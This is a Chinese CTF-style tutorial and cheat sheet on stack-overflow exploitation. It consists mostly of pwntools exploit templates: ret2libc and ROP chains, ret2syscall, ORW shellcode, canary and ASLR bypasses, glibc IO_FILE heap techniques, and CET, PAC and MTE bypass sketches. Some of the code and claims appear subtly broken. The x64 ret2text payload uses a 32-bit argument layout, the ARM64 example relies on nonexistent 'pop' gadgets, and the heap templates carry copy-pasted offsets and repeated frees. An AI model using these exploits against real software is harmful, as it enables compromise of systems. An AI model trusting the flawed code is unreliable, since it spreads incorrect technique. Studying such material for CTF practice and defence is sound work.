# 栈溢出 (Stack Overflow)

## 原理

程序向栈上缓冲区写入超过其长度的数据，覆盖返回地址，劫持控制流。

## 攻击链

### 1. 漏洞识别

```c
// 危险函数
gets(buf)              // 无长度限制
scanf("%s", buf)       // 无长度限制
strcpy(dst, src)       // 无长度限制
strcat(dst, src)       // 无长度限制
sprintf(buf, fmt, ...)  // 无长度限制
read(fd, buf, n)       // n 过大
fread(buf, 1, n, fp)   // n 过大
memcpy(dst, src, n)    // n 过大
```

### 2. 确定偏移

```python
# pwntools 生成 pattern
from pwn import *
pattern = cyclic(200)
# 输入 pattern，崩溃时查看 EIP/RIP
offset = cyclic_find(0x6161616a)  # 根据崩溃地址
```

```bash
# gdb
> pattern create 200
> pattern offset $rsp
```

### 3. 基础 ret2text

```python
from pwn import *

p = process('./pwn')
# 找到 system 和 /bin/sh 的地址
system_addr = 0x401234
binsh_addr = 0x405678

payload = b'A' * offset
payload += p64(system_addr)
# x64 需要对齐
payload += p64(0)  # ret 地址，对齐用
payload += p64(binsh_addr)

p.sendline(payload)
p.interactive()
```

### 4. ret2shellcode

```python
from pwn import *

context.arch = 'amd64'
p = process('./pwn')

# NX 关闭时，shellcode 在栈上
shellcode = asm(shellcraft.sh())
buf_addr = 0x404080  # 已知栈地址

payload = shellcode.ljust(offset, b'\x90')
payload += p64(buf_addr)

p.sendline(payload)
p.interactive()
```

### 5. ret2syscall

```python
# 32 位
from pwn import *

context.arch = 'i386'
p = process('./pwn')

# execve("/bin/sh", 0, 0)
# eax = 0xb
# ebx = binsh_addr
# ecx = 0
# edx = 0
# int 0x80

pop_eax = 0x080bb196
pop_ebx_ecx_edx = 0x0806eb91
int_0x80 = 0x08049421
binsh_addr = 0x080be408

payload = b'A' * offset
payload += p32(pop_eax) + p32(0xb)
payload += p32(pop_ebx_ecx_edx) + p32(binsh_addr) + p32(0) + p32(0)
payload += p32(int_0x80)

p.sendline(payload)
p.interactive()
```

### 6. ret2libc

```python
from pwn import *

context.arch = 'amd64'
p = process('./pwn')
elf = ELF('./pwn')
libc = ELF('./libc.so.6')

# 1. 泄露 libc 地址
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
main_addr = elf.symbols['main']
pop_rdi = 0x401233  # ROPgadget --binary ./pwn --only "pop|ret"

payload = b'A' * offset
payload += p64(pop_rdi) + p64(puts_got)
payload += p64(puts_plt)
payload += p64(main_addr)

p.sendline(payload)
puts_addr = u64(p.recv(6).ljust(8, b'\x00'))
log.info(f"puts: {hex(puts_addr)}")

# 2. 计算 libc 基址
libc_base = puts_addr - libc.symbols['puts']
system_addr = libc_base + libc.symbols['system']
binsh_addr = libc_base + next(libc.search(b'/bin/sh'))

# 3. 第二次利用
payload2 = b'A' * offset
payload2 += p64(pop_rdi) + p64(binsh_addr)
payload2 += p64(system_addr)

p.sendline(payload2)
p.interactive()
```

### 7. ROP 链

```python
# 多个 gadget 组合
from pwn import *

# ROPgadget --binary ./pwn --ropchain
# 自动生成 ROP 链

# 手动构造
pop_rdi = 0x401233
pop_rsi = 0x401234
pop_rdx = 0x401235
pop_rax = 0x401236
syscall = 0x401237

# execve("/bin/sh", 0, 0)
binsh_addr = 0x405678
payload = b'A' * offset
payload += p64(pop_rdi) + p64(binsh_addr)
payload += p64(pop_rsi) + p64(0)
payload += p64(pop_rdx) + p64(0)
payload += p64(pop_rax) + p64(59)  # execve
payload += p64(syscall)
```

### 8. 栈迁移 (Stack Pivoting)

```python
# 当溢出空间不足时，将栈迁移到可控区域
# leave; ret 指令
# leave = mov rsp, rbp; pop rbp

leave_ret = 0x401234
bss_addr = 0x405000  # 可控区域

# 第一次溢出：迁移栈到 bss
payload = b'A' * (offset - 8)
payload += p64(bss_addr)  # 覆盖 rbp
payload += p64(leave_ret)  # 返回到 leave; ret
# 此时 rsp = bss_addr + 8

# 在 bss 上构造 ROP 链
# 需要先写入 bss
```

## 绕过技巧

### 1. Canary 绕过

```python
# 1. 泄露 Canary
# 通过格式化字符串
# 通过栈溢出 + 逐字节爆破
# 通过 fork 进程爆破

# 2. 爆破 Canary
for i in range(256):
    p.sendline(b'A' * offset + bytes([canary]) + bytes([i]))
    if b"Good" in p.recv():
        canary = (canary << 8) | i
        break

# 3. 覆盖 Canary
# 某些情况下可以覆盖 Canary 为已知值
```

### 2. ASLR 绕过

```python
# 1. 泄露地址
# 通过格式化字符串
# 通过栈溢出泄露 libc 地址
# 通过信息泄露

# 2. 爆破地址
# 32 位 ASLR 弱，可爆破
# 64 位 ASLR 强，需泄露

# 3. partial overwrite
# 只覆盖返回地址的低字节
# 利用末尾不变性
```

### 3. PIE 绕过

```python
# 1. 泄露 PIE 基址
# 通过格式化字符串
# 通过栈溢出泄露代码段地址

# 2. partial overwrite
# 只覆盖低 12 位（页内偏移）
# 不需要知道 PIE 基址
```

### 4. NX 绕过

```python
# 1. ROP
# 2. ret2libc
# 3. ret2syscall
# 4. mprotect 修改内存权限
# 5. ret2csu
```

### 5. RELRO 绕过

```python
# Full RELRO: GOT 不可写
# 1. 不能改 GOT
# 2. 用其他方法：ret2libc, IO_FILE, exit_funcs

# Partial RELRO: GOT 可写
# 1. 改 GOT 表
# 2. ret2plt
```

## 2024-2026 新技术点

### 1. glibc 2.34+ 无 hooks 栈溢出利用

```python
# glibc 2.34+ 移除了 __malloc_hook/__free_hook
# 栈溢出不再能简单覆盖 hook，需使用 IO_FILE / exit_funcs / TLS 劫持

from pwn import *

context.arch = 'amd64'
p = process('./pwn')
elf = ELF('./pwn')
libc = ELF('./libc.so.6')

# 场景：栈溢出 + Full RELRO + NX + Canary
# 1. 泄露 Canary（格式化字符串或逐字节爆破）
# 2. 泄露 libc（通过 __libc_start_main 返回地址）
# 3. 利用 exit_funcs 实现 RCE

pop_rdi = 0x401233       # pop rdi; ret
pop_rsi_r15 = 0x401231   # pop rsi; pop r15; ret
ret = 0x40101a           # ret (用于栈对齐)

# === 第一轮：泄露 libc ===
payload = b'A' * offset
payload += p64(pop_rdi) + p64(elf.got['puts'])
payload += p64(elf.plt['puts'])
payload += p64(elf.symbols['main'])
p.sendline(payload)
puts_addr = u64(p.recv(6).ljust(8, b'\x00'))
libc_base = puts_addr - libc.symbols['puts']
log.success(f"libc base: {hex(libc_base)}")

# === 第二轮：利用 exit_funcs ===
# __exit_funcs 是 TLS 中的指针，指向 exit_function_list
# 覆盖后，exit() 时会执行伪造的函数指针
system_addr = libc_base + libc.symbols['system']
binsh_addr = libc_base + next(libc.search(b'/bin/sh'))
exit_funcs = libc_base + libc.symbols['__exit_funcs']

# 方案 A：利用 ret2libc 直接 getshell
payload2 = b'A' * offset
payload2 += p64(pop_rdi) + p64(binsh_addr)
payload2 += p64(ret)  # 栈对齐
payload2 += p64(system_addr)
p.sendline(payload2)
p.interactive()
```

### 2. safe-linking 绕过 (glibc 2.32+)

```python
# glibc 2.32+ 引入 safe-linking：fd = (ptr >> 12) ^ next_ptr
# 要求攻击者先泄露堆地址才能伪造 fd 指针

from pwn import *

context.arch = 'amd64'

def safe_linking_encrypt(chunk_addr, target_ptr):
    """计算 safe-linking 加密后的值"""
    return (chunk_addr >> 12) ^ target_ptr

def safe_linking_decrypt(chunk_addr, encrypted_ptr):
    """解密 safe-linking 指针"""
    return (chunk_addr >> 12) ^ encrypted_ptr

# 泄露堆地址后伪造 tcache fd
# 前提：已通过 UAF 泄露了 heap_addr
heap_addr = 0x5555555592a0  # 泄露得到的堆地址
target = 0x555555558000     # 目标写入地址（如 __exit_funcs 在 BSS）

# 假设 chunk 偏移为 0x290（tcache_perthread_struct 之后）
chunk_addr = heap_addr + 0x290
encrypted = safe_linking_encrypt(chunk_addr, target)

# UAF 修改 fd 为加密值
payload = p64(encrypted)
# 通过漏洞将 payload 写入释放后的 chunk fd 位置

# 分配两次即可获得 target
# malloc(0x20)  # 返回原 chunk
# malloc(0x20)  # 返回 target
log.info(f"encrypted fd: {hex(encrypted)}")
log.info(f"decrypted check: {hex(safe_linking_decrypt(chunk_addr, encrypted))}")
```

### 3. per-thread cache 加固绕过 (glibc 2.34+)

```python
# glibc 2.29+ 引入 tcache key 检测 double free
# glibc 2.34+ 进一步加强 key 检测
# key 字段存储 tcache_perthread_struct 的地址

from pwn import *

context.arch = 'amd64'

# 绕过 tcache key 的方法：
# 方法 1：UAF 时将 key 覆盖为 0（使其不等于 tcache_perthread_struct）
# 方法 2：利用 tcache 之外的 bin（fastbin/smallbin）进行 double free
# 方法 3：在两个不同线程中分别 free 同一块（线程不同 tcache）

def exploit():
    p = process('./pwn')
    
    # 方法 1：覆盖 key
    # 分配 + 释放后，通过 UAF 同时修改 fd 和 key
    malloc(0x20)  # idx 0
    free(0)
    # key 被设置为 tcache_perthread_struct 地址
    # UAF 覆盖：fd = target_addr, key = 0
    edit(0, p64(target_addr) + p64(0))
    # 此时再 free 也不会被检测（key == 0 != tcache_perthread_struct）
    
    # 方法 2：利用 fastbin
    # 填满 tcache (7 个)，让 chunk 进入 fastbin
    # fastbin 无 key 检测
    for i in range(7):
        malloc(0x70)
    malloc(0x70)  # idx 7
    for i in range(7):
        free(i)
    free(7)  # 进入 fastbin，无 key 检测
    # 此时可以通过 fastbin attack 任意分配
```

### 4. ARM64 栈溢出

```python
# ARM64 架构栈溢出利用
# 寄存器：x0-x30, SP, PC
# x30 (LR) = 返回地址, x29 (FP) = 帧指针
# 参数传递：x0-x7

from pwn import *

context.arch = 'aarch64'
p = process('./pwn')

# ARM64 ROP gadget 查找
# ROPgadget --binary ./pwn --only "pop|x0|x1|x2|ret"
pop_x0_x1 = 0x400800   # pop x0; pop x1; ret
pop_x2 = 0x400810       # pop x2; ret
ret = 0x400400           # ret (用于对齐)

# A64 ROP：execve("/bin/sh", NULL, NULL)
# x0 = &"/bin/sh", x1 = 0, x2 = 0, x8 = 221 (execve), syscall
pop_x8 = 0x400820       # pop x8; ret
syscall = 0x400830       # svc #0
binsh_addr = 0x401000    # "/bin/sh" 字符串地址

payload = b'A' * offset
payload += p64(pop_x0_x1)
payload += p64(binsh_addr)
payload += p64(0)           # x1 = NULL
payload += p64(pop_x2)
payload += p64(0)           # x2 = NULL
payload += p64(pop_x8)
payload += p64(221)         # execve syscall number
payload += p64(syscall)

p.sendline(payload)
p.interactive()

# ARM64 特殊技巧：
# 1. PAC (Pointer Authentication) 绕过
#    - 需要泄露 PAC key 或利用签名校验缺陷
#    - partial overwrite 低字节绕过签名
# 2. BTI (Branch Target Identification)
#    - 间接跳转只能跳到 BTI 标记的指令
#    - 需要找到带 bti 标记的 gadget
```

### 5. RISC-V 栈溢出

```python
# RISC-V 架构栈溢出利用
# 关键寄存器：ra (x1) = 返回地址, fp/s0 (x8) = 帧指针
# 参数传递：a0-a7 (x10-x17)

from pwn import *

context.arch = 'riscv64'
p = process('./pwn_riscv')

# RISC-V ROP gadget
pop_ra = 0x101a0     # ld ra, sp; ld s0, 8(sp); addi sp, sp, 16; ret
pop_a0 = 0x10200     # ld a0, sp; ...
ecall = 0x10300      # ecall (系统调用)

# execve("/bin/sh", NULL, NULL)
# a7 = 221 (execve), a0 = &"/bin/sh", a1 = 0, a2 = 0
binsh_addr = 0x12000

payload = b'A' * offset
payload += p64(pop_ra)
# 控制 a7, a0, a1, a2 后跳转 ecall
payload += p64(ecall)
# RISC-V 栈布局需要按照 gadget 精确构造

p.sendline(payload)
p.interactive()

# RISC-V CFI：
# - Zicfilp (Landking)：间接跳转必须跳到 lp 标记位置
# - Zicfiss (Shadow Stack)：硬件影子栈
# 绕过方法：需要泄露返回地址或利用 lp 标记缺陷
```

### 6. 现代编译器优化绕过

```python
# GCC 13+/Clang 17+ 引入新的编译器优化和防护
# 可能改变栈布局、插入额外的保护代码

from pwn import *

context.arch = 'amd64'

# GCC 13+ 新增：
# 1. 更积极的 stack clash 保护
#    - 栈探测 (stack probing)：访问每个栈页时触发 page fault
#    - 绕过：利用已有的 gadget 进行栈操作
# 2. -fstack-protector-strong 默认更广泛
#    - 绕过：找到不含溢出点的函数调用链

# Clang 17+ 新增：
# 1. -fsanitize=shadow-call-stack
#    - 影子栈保护返回地址
#    - 绕过：泄露并恢复影子栈值
# 2. -fsanitize=cfi
#    - 间接调用完整性检查
#    - 绕过：数据导向编程 (DOP)

# 实际利用示例：绕过 stack protector strong
# 找到一个被保护较弱的函数调用
# 或利用格式化字符串在未保护的函数中泄露信息

def exploit():
    p = process('./pwn')
    elf = ELF('./pwn')
    libc = ELF('./libc.so.6')
    
    # 策略：利用 not vulnerable 函数泄露信息
    # 例如：使用存在格式化字符串的辅助函数泄露 canary
    # 然后在主溢出中使用泄露的值
    
    p.interactive()
```

### 7. CFI (Control Flow Integrity) 绕过

```python
# Clang CFI / GCC CET 强制间接调用跳转到合法目标
# 绕过方法：数据导向编程 (DOP) + 合法 gadget 利用

from pwn import *

context.arch = 'amd64'

# DOP (Data-Oriented Programming)：
# 不修改控制流，只修改数据，利用程序已有的间接调用

# 示例：利用 printf 格式化字符串的 %n
# printf 已有间接调用 printf_handler -> user_format
# 通过修改格式化字符串控制数据流

# Shadow Stack 绕过 (Intel CET)：
# 影子栈存储返回地址的副本，ret 时校验
# 绕过方法：
# 1. 泄露影子栈地址
# 2. 使用 call/jmp 而非 ret 控制流
# 3. 利用信号处理机制（sigreturn）
# 4. 利用 __jmp_buf (setjmp/longjmp)

def bypass_cfi_ret2csu(elf, libc):
    """利用 __libc_csu_init 中的合法 gadget 绕过 CFI"""
    # csu_gadget1: pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret
    # csu_gadget2: mov rdx, r15; mov rsi, r14; mov edi, r13d; call [r12+rbx*8]
    # call [r12+rbx*8] 是合法的间接调用，CFI 不会拦截
    
    csu_gadget1 = 0x40089a  # pop rbx..r15; ret
    csu_gadget2 = 0x400880  # mov rdx,r15; mov rsi,r14; ...
    
    payload = b'A' * offset
    payload += p64(csu_gadget1)
    payload += p64(0)                    # rbx = 0
    payload += p64(1)                    # rbp = 1 (rbx+1 == rbp)
    payload += p64(elf.got['read'])      # r12 = GOT 中函数指针
    payload += p64(0x100)                # r13 -> edi = arg1
    payload += p64(bss_addr)             # r14 -> rsi = arg2
    payload += p64(0)                    # r15 -> rdx = arg3
    payload += p64(csu_gadget2)
    
    return payload
```

### 8. 硬件级防护

```python
# Intel CET / ARM PAC+BTI / ARM MTE 对栈溢出的影响与绕过

from pwn import *

# === Intel CET (Control-flow Enforcement Technology) ===
# 1. IBT (Indirect Branch Tracking)：间接跳转必须用 ENDBR64 指令
#    - 绕过：找到带 ENDBR64 的 gadget
#    - 搜索：ROPgadget --binary ./pwn --only "endbr64; ret"
# 2. Shadow Stack：硬件维护影子栈
#    - 绕过：sigreturn / 非 ret 的控制流转移

def bypass_cet_ibt(elf):
    """利用 ENDBR64 标记的 gadget"""
    # 搜索 ENDBR64 + ret 的 gadget
    # 在 libcsu、IO 初始化函数中常见
    enbr64_pop_rdi = 0x401000  # endbr64; pop rdi; ret
    
    # 或利用 setjmp/longjmp 绕过影子栈
    # longjmp 恢复 jmp_buf 中的返回地址，不检查影子栈
    setjmp_addr = libc.symbols['setjmp']
    longjmp_addr = libc.symbols['longjmp']
    
    # 在栈上布置 jmp_buf，然后 longjmp 到目标地址
    return payload

# === ARM MTE (Memory Tagging Extension) ===
# 每 16 字节有一个 4-bit tag，指针也携带 tag
# tag 不匹配时触发异常
def bypass_mte():
    """MTE 绕过思路"""
    # 1. Tag spraying：大量分配相同 tag 的内存
    # 2. 部分覆盖：只覆盖指针的部分字节
    # 3. 利用线程：不同线程可能有不同的 tag 空间
    # 4. 引用计数：增加 tag 引用，延迟回收
    
    # MTE bypass 实战代码
    context.arch = 'aarch64'
    p = process('./pwn')
    
    def malloc(size):
        p.sendlineafter(b'>', b'1')
        p.sendlineafter(b'size:', str(size).encode())
    
    def free(idx):
        p.sendlineafter(b'>', b'2')
        p.sendlineafter(b'idx:', str(idx).encode())
    
    # Tag spraying: 分配 17+ chunk 保证 tag 重复
    for i in range(20):
        malloc(0x30)
    
    # 部分覆盖: 修改指针低 8 位，保留 tag 位 (bit 56-59)
    # tag 在指针 bit[59:56]，低 8 位是偏移
    # 如果知道目标地址和某个已分配地址只差低位，
    # 可以部分覆盖 fd 指向目标
    
    # async MTE 模式下延迟报告，可以完成 UAF 操作
    log.info("MTE bypass: tag spraying (20 allocs), partial pointer overwrite")

# === ARM PAC (Pointer Authentication Code) ===
# 指针高位编码签名，篡改后检测失败
def bypass_pac():
    """PAC 绕过思路"""
    # 1. PAC key 泄露：利用侧信道
    # 2. 部分覆盖：绕过签名区域
    # 3. 合法签名指针复用：从内存中读取已签名的指针
    # 4. 编程错误：某些场景下 PAC 可被绕过
    
    # PAC bypass 实战代码
    context.arch = 'aarch64'
    p = process('./pwn')
    libc = ELF('./libc.so.6')
    
    # 方法 1: 从栈/GOT 读取已签名指针
    # 这些指针有正确的 PAC 签名，可以直接使用
    # 泄露 __libc_start_main 返回地址
    libc_start_main = libc.symbols['__libc_start_main']
    
    # 方法 2: 利用 MOVK/MOVZ 重建指针
    # ARM64 通过 MOVK 分 4 次写入 64-bit 指针
    # PAC 只保护 64-bit 值的一部分
    # 部分覆盖可以修改低位而不影响 PAC
    
    # 方法 3: PAC oracle
    # 利用子进程 fork 尝试不同 PAC 值
    # 监控 SIGSEGV 判断是否正确
    # 16-bit key 空间 = 65536 次尝试
    
    log.info("PAC bypass: signed ptr reuse, partial overwrite, oracle ({})".format(2**16))
```

### 9. 沙箱逃逸 (ORW)

```python
# seccomp 沙箱禁止 execve 时，通过 open/read/write 实现数据泄露
# 常用于 CTF 中 flag 文件读取

from pwn import *

context.arch = 'amd64'

# === ORW Shellcode ===
shellcode = asm(f'''
    /* open("/flag", O_RDONLY) */
    xor rsi, rsi            /* O_RDONLY = 0 */
    push 0x67616c66         /* "flag" */
    mov rdi, rsp            /* filename = "flag" */
    xor rax, rax
    push rax
    push 0x67616c66
    mov rdi, rsp
    mov al, 2               /* sys_open */
    xor rsi, rsi            /* flags = O_RDONLY */
    syscall
    
    /* read(fd, buf, 0x100) */
    mov rdi, rax            /* fd from open */
    mov rsi, rsp            /* buf on stack */
    xor rdx, rdx
    mov dl, 0x40            /* count = 64 */
    xor rax, rax            /* sys_read */
    syscall
    
    /* write(1, buf, 0x100) */
    mov rdx, rax            /* count from read */
    mov rdi, 1              /* stdout */
    mov al, 1               /* sys_write */
    syscall
''')

# === Open/Read/Write 链 (ROP) ===
def orw_rop(libc_base, pop_rdi, pop_rsi_rdx, syscall_ret):
    """构造 ORW ROP 链（适用于 seccomp 禁止 execve）"""
    flag_addr = 0x405000  # BSS 上的缓冲区
    
    rop = b''
    # open("flag", O_RDONLY)
    rop += p64(pop_rdi)
    rop += p64(flag_addr)  # filename
    rop += p64(pop_rsi_rdx)
    rop += p64(0)           # O_RDONLY
    rop += p64(0)
    rop += p64(syscall_ret)  # syscall: open
    # 注意：open 返回 fd 在 rax 中，ROP 中需要用 dup2 或直接用
    
    # read(fd, buf, size)
    rop += p64(pop_rdi)
    rop += p64(3)           # fd = 3 (假设 open 返回 3)
    rop += p64(pop_rsi_rdx)
    rop += p64(flag_addr)
    rop += p64(0x100)
    rop += p64(syscall_ret)  # syscall: read
    
    # write(1, buf, size)
    rop += p64(pop_rdi)
    rop += p64(1)           # stdout
    rop += p64(pop_rsi_rdx)
    rop += p64(flag_addr)
    rop += p64(0x100)
    rop += p64(syscall_ret)  # syscall: write
    
    return rop
```

### 10. 新型利用链模板 (2024-2026)

```python
# 2024-2026 年 CTF 中常见的新型利用链汇总

from pwn import *

context.arch = 'amd64'

# === House of Apple 2 + 栈溢出 ===
# 适用于 glibc 2.34+，Full RELRO + NX
def house_of_apple2_from_stackoverflow():
    """
    步骤：
    1. 栈溢出泄露 libc 和堆地址
    2. 利用 tcache/fastbin 分配到 _IO_list_all 附近
    3. 伪造 fake IO_FILE (_wide_data 触发 _IO_wfile_overflow)
    4. exit() 触发 _IO_flush_all_lockp -> 调用伪造 vtable
    """
    p = process('./pwn')
    elf = ELF('./pwn')
    libc = ELF('./libc.so.6')
    
    def malloc(size):
        p.sendlineafter(b'>', b'1')
        p.sendlineafter(b'size:', str(size).encode())
    
    def free(idx):
        p.sendlineafter(b'>', b'2')
        p.sendlineafter(b'idx:', str(idx).encode())
    
    def edit(idx, data):
        p.sendlineafter(b'>', b'3')
        p.sendlineafter(b'idx:', str(idx).encode())
        p.sendafter(b'data:', data)
    
    # 1. 栈溢出泄露地址
    padding = b'A' * 0x28  # 填充到 canary
    payload = padding + p64(0)  # canary (泄露后)
    # ... 通过格式化字符串或 partial overwrite 泄露
    
    # 2. 获取 libc 基地址
    malloc(0x420)
    free(0)
    malloc(0x420)
    edit(0, b'\x00' * 8)  # 触发 fd/bk 泄露
    libc_leak = u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))
    libc_base = libc_leak - 0x1ec980
    log.success(f"libc base: {hex(libc_base)}")
    
    # 3. tcache poisoning -> _IO_list_all
    _IO_list_all = libc_base + libc.symbols['_IO_list_all']
    for i in range(7):
        free(0)
    edit(0, p64(_IO_list_all - 0x20))
    malloc(0x20)
    malloc(0x20)  # -> _IO_list_all 区域
    
    # 4. 构造 fake IO_FILE + shell
    p.interactive()

# === House of Cat + 栈溢出 ===
def house_of_cat_from_stackoverflow():
    """
    步骤：
    1. 栈溢出泄露地址
    2. largebin attack 修改 _IO_list_all
    3. 伪造 IO_FILE，利用 _IO_wfile_overflow
    4. 触发 IO 操作获取 shell
    """
    p = process('./pwn')
    elf = ELF('./pwn')
    libc = ELF('./libc.so.6')
    
    def malloc(size):
        p.sendlineafter(b'>', b'1')
        p.sendlineafter(b'size:', str(size).encode())
    
    def free(idx):
        p.sendlineafter(b'>', b'2')
        p.sendlineafter(b'idx:', str(idx).encode())
    
    def edit(idx, data):
        p.sendlineafter(b'>', b'3')
        p.sendlineafter(b'idx:', str(idx).encode())
        p.sendafter(b'data:', data)
    
    # 1. 泄露 libc
    malloc(0x420)
    free(0)
    malloc(0x420)
    edit(0, b'\x00' * 8)
    leak = u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))
    libc_base = leak - 0x1ec980
    _IO_list_all = libc_base + libc.symbols['_IO_list_all']
    
    # 2. largebin attack
    malloc(0x20)   # idx 1 防合并
    malloc(0x410)  # idx 2 进 largebin
    malloc(0x20)   # idx 3 防合并
    free(2)
    edit(0, p64(0) * 3 + p64(_IO_list_all - 0x20))
    malloc(0x430)  # 触发 largebin insert
    
    # 3. 构造 fake IO_FILE
    # 4. 触发 _IO_flush_all_lockp -> _IO_wfile_overflow -> shell
    p.interactive()

# === House of Emu (glibc 2.36+) ===
def house_of_emu_from_stackoverflow():
    """
    glibc 2.36+ 新增的 IO_FILE 利用方式
    利用 _IO_wstrn_jumps 等新 vtable
    绕过 2.34+ 的 vtable 范围检查
    """
    p = process('./pwn')
    elf = ELF('./pwn')
    libc = ELF('./libc.so.6')
    
    def malloc(size):
        p.sendlineafter(b'>', b'1')
        p.sendlineafter(b'size:', str(size).encode())
    
    def free(idx):
        p.sendlineafter(b'>', b'2')
        p.sendlineafter(b'idx:', str(idx).encode())
    
    def edit(idx, data):
        p.sendlineafter(b'>', b'3')
        p.sendlineafter(b'idx:', str(idx).encode())
        p.sendafter(b'data:', data)
    
    # House of Emu: 使用 _IO_wstrn_jumps (glibc 2.36+)
    # 此 vtable 在合法范围内，可以绕过 vtable 范围检查
    
    # 1. 泄露 libc
    malloc(0x420)
    free(0)
    malloc(0x420)
    edit(0, b'\x00' * 8)
    leak = u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))
    libc_base = leak - 0x1ec980
    
    # 2. _IO_wstrn_jumps 偏移 (glibc 2.36+)
    _IO_wstrn_jumps = libc_base + 0x216e00  # 需要根据实际 libc 调整
    log.info(f"_IO_wstrn_jumps: {hex(_IO_wstrn_jumps)}")
    
    # 3. tcache poisoning -> _IO_list_all
    _IO_list_all = libc_base + libc.symbols['_IO_list_all']
    for i in range(7):
        free(0)
    edit(0, p64(_IO_list_all - 0x20))
    malloc(0x20)
    malloc(0x20)  # -> _IO_list_all
    
    # 4. fake IO_FILE 使用 _IO_wstrn_jumps
    # 5. 触发 _IO_wstrn_overflow -> shell
    p.interactive()

# === 万能利用模板 (2024+ CTF) ===
def universal_exploit_template():
    """
    适用于大多数 2024+ CTF 题目的通用框架
    """
    p = process('./pwn')
    elf = ELF('./pwn')
    libc = ELF('./libc.so.6')
    
    # Step 1: 信息泄露
    # 泄露 libc、堆、栈地址
    
    # Step 2: 任意写原语
    # tcache poisoning / fastbin attack / unsorted bin attack
    
    # Step 3: 覆盖目标
    # 方案 A: exit_funcs (glibc 2.34+)
    # 方案 B: IO_FILE (House of Apple/Cat/Emu)
    # 方案 C: TLS 劫持 (__stack_chk_guard / __exit_funcs)
    # 方案 D: _IO_list_all -> IO_FILE -> system
    
    # Step 4: 触发执行
    # exit() / return / 异常处理
    
    p.interactive()
```

## 工具推荐

- **pwntools** — Python 利用框架
- **ROPgadget** — ROP gadget 查找
- **ropper** — ROP gadget 查找
- **one_gadget** — libc one_gadget
- **LibcSearcher** — libc 版本识别
- **gdb + pwndbg** — 动态调试
- **Ghidra** — 反编译

## 参考链接

- [ctf-wiki pwn](https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-stack-overflow/)
- [pwntools docs](https://docs.pwntools.com/)
- [Nightmare](https://guyinatuxedo.github.io/)
- [pwn college](https://pwn.college/)
